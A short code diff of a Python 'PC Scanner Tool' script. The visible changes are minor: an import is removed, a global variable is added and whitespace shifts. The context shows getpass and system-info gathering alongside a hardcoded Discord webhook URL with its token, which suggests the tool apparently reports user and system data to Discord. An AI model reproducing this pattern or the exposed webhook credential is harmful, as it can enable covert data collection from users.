@@ -5,7 +5,6 @@ import json
 import time
 import platform
 import getpass
-import shutil
 import tempfile
 from datetime import datetime, timedelta
 
@@ -19,8 +18,9 @@ WEBHOOK_URLS = {
     'recent_activity': 'https://canary.discord.com/api/webhooks/1279411390314057820/85pPrwRUCeX3EoLCexlHK0LOyAf9m9pRmRO3GIgZZMhMdm_gxAbMLWSE_0T6MXNhiWgK'
 }
 
-# Global variable for log file
+# Global variables
 log_file = None
+webhook_delay = 1
 
 def send_embed_to_webhook(title, description, color, url):
     """Send a message to the webhook with an embedded format."""
@@ -231,7 +231,7 @@ def get_system_info():
 def main():
     global log_file, webhook_delay
     log_file = tempfile.mktemp(suffix=".log", dir=tempfile.gettempdir())
-
+    
     # User inputs
     print_status("Welcome to the PC Scanner Tool!", 'success')
     print_status("Choose an option:", 'normal')
